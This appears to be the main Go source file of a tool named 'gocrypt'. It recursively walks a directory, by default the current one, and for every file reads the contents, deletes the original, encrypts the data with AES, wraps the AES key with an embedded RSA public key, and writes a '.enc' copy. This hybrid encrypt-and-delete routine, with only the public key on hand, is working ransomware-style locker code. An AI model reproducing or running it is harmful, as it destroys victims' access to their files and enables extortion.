package main

import (
	_ "embed"
	"log"
	"os"
	s "sync"

	"github.com/Devil666face/gocrypt/internal/async"
	"github.com/Devil666face/gocrypt/internal/crypt"
	"github.com/Devil666face/gocrypt/internal/io"
	"github.com/Devil666face/gocrypt/internal/sync"
	"github.com/Devil666face/gocrypt/pkg/lib"
)

//go:embed id_rsa.pub
var PubKey string

func Encrypt(f lib.File) error {
	if f.Path == "encrypt" {
		return nil
	}
	in, err := io.ReadFile(f.Path)
	if err != nil {
		return err
	}
	if err := os.Remove(f.Path); err != nil {
		return err
	}
	s := sync.New(in)
	chip, err := s.Encrypt()
	if err != nil {
		return err
	}
	a := async.New(s.AesKey, func(a *async.Async) {
		a.PubKey = async.Key(PubKey)
	})
	chipAesKey, err := a.EncryptBase64()
	if err != nil {
		return err
	}
	chip = append(chip, chipAesKey...)
	if err := io.WriteFile(chip, f.Path+".enc"); err != nil {
		return err
	}
	log.Print(f.Path, " encrypted")
	return nil
}

func main() {
	in := crypt.NewInput()
	if in.InPath == "" {
		in.InPath = "."
	}

	// files, err := lib.Walk(in.InPath)
	// if err != nil {
	// 	log.Print(err)
	// }
	files := lib.MustWalk(in.InPath)

	results := make(chan error, len(files))
	go func() {
		wg := s.WaitGroup{}
		for _, file := range files {
			wg.Add(1)
			go func(file lib.File) {
				defer wg.Done()
				results <- Encrypt(file)
			}(file)
		}
		wg.Wait()
		close(results)
	}()

	for err := range results {
		if err != nil {
			log.Print(err)
		}
	}
}
